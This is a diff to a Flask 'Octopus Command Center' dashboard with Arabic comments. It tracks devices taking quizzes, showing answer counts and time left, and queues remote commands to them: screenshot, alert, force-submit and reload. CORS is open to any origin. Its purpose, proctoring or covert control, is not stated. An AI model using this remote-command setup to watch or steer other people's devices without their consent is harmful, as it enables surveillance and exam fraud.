@@ -8,11 +8,11 @@ from datetime import datetime, timedelta
 from collections import defaultdict
 
 app = Flask(__name__)
-# تفعيل CORS للسماح بالاتصال من أي مكان (Android, Local HTML, etc.)
+# تفعيل CORS للسماح بالاتصال من أي مكان (أندرويد، متصفح، ملفات محلية)
 CORS(app, resources={r"/*": {"origins": "*"}})
 
 # زيادة حجم البيانات المسموح بها لاستلام الصور الكبيرة
-app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB
+app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # 32MB
 
 # ملفات تخزين البيانات لضمان عدم ضياعها عند إعادة التشغيل
 DATA_FILE = '/tmp/octopus_data.json'
@@ -112,7 +112,7 @@ def get_commands():
 
 @app.route('/send_command', methods=['POST'])
 def send_command():
-    """إرسال أمر من لوحة التحكم"""
+    """إرسال أمر من لوحة التحكم (الويب أو التطبيق)"""
     try:
         data = request.json
         did = data.get('device_id')
@@ -158,13 +158,13 @@ def view_dashboard():
         status_text = "🟢 ONLINE" if is_active else "🔴 OFFLINE"
         if is_active: active_count += 1
         
-        # زر التحكم المباشر
+        # أزرار التحكم المباشر من الويب
         controls = f"""
         <div class="btn-group btn-group-sm">
-            <button onclick="sendCommand('{did}', 'screenshot')" class="btn btn-outline-primary">📸</button>
-            <button onclick="sendCommand('{did}', 'alert')" class="btn btn-outline-warning">📢</button>
-            <button onclick="sendCommand('{did}', 'force_submit')" class="btn btn-outline-danger">🚀</button>
-            <button onclick="sendCommand('{did}', 'reload')" class="btn btn-outline-success">🔄</button>
+            <button onclick="cmd('{did}', 'screenshot')" class="btn btn-outline-info" title="Screenshot">📸</button>
+            <button onclick="cmd('{did}', 'alert')" class="btn btn-outline-warning" title="Alert">🔔</button>
+            <button onclick="cmd('{did}', 'force_submit')" class="btn btn-outline-danger" title="Force Submit">⛔</button>
+            <button onclick="cmd('{did}', 'reload')" class="btn btn-outline-success" title="Reload">🔄</button>
         </div>
         """
 
@@ -174,6 +174,7 @@ def view_dashboard():
             <td><span class="device-id">{did}</span></td>
             <td>{data.get('quiz', 'Unknown')}</td>
             <td>{data.get('answers_count', '0')}</td>
+            <td>{data.get('time_left', '0')}s</td>
             <td><span class="{status_class}">{status_text}</span></td>
             <td>{last_up.strftime('%H:%M:%S')}</td>
             <td>{controls}</td>
@@ -189,7 +190,7 @@ def view_dashboard():
         <title>Octopus Command Center</title>
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
         <style>
-            body {{ background: #0f172a; color: #f8fafc; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
+            body {{ background: #0f172a; color: #f8fafc; font-family: 'Segoe UI', sans-serif; }}
             .container {{ max-width: 1400px; margin-top: 30px; }}
             .card {{ background: #1e293b; border: 1px solid #334155; border-radius: 12px; }}
             .table {{ --bs-table-bg: transparent; --bs-table-color: #cbd5e1; }}
@@ -200,31 +201,26 @@ def view_dashboard():
             .status-inactive {{ color: #94a3b8; }}
             .stat-box {{ background: #0f172a; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #334155; }}
             .stat-val {{ font-size: 1.8rem; font-weight: 700; color: #38bdf8; }}
-            .btn-outline-primary:hover {{ background: #3b82f6; }}
+            .btn-outline-info:hover {{ background: #0dcaf0; color: #000; }}
         </style>
         <script>
-            // تحديث تلقائي للصفحة
-            setTimeout(() => location.reload(), 8000);
-
-            // دالة إرسال الأوامر (AJAX)
-            function sendCommand(did, type) {{
-                let extra = "";
-                if(type === 'alert') extra = prompt("Enter message:");
-                if(type === 'alert' && !extra) return;
+            function cmd(id, type) {{
+                let msg = "";
+                if(type === 'alert') msg = prompt("Enter alert message:");
+                if(type === 'alert' && !msg) return;
 
                 fetch('/send_command', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{
-                        device_id: did,
-                        type: type,
-                        message: extra
-                    }})
-                }}).then(r => r.json()).then(d => {{
-                    if(d.status === 'queued') alert("✅ Command Sent!");
-                    else alert("❌ Error: " + d.msg);
+                    body: JSON.stringify({{device_id: id, type: type, message: msg}})
+                }})
+                .then(r => r.json())
+                .then(d => {{
+                    if(d.status === 'queued') alert("✅ Command Sent Successfully!");
+                    else alert("❌ Failed: " + d.msg);
                 }});
             }}
+            setTimeout(() => location.reload(), 10000);
         </script>
     </head>
     <body>
@@ -251,8 +247,9 @@ def view_dashboard():
                             <tr>
                                 <th>#</th>
                                 <th>Device ID</th>
-                                <th>Current Page</th>
+                                <th>Exam</th>
                                 <th>Answers</th>
+                                <th>Left</th>
                                 <th>Status</th>
                                 <th>Last Seen</th>
                                 <th>Actions</th>
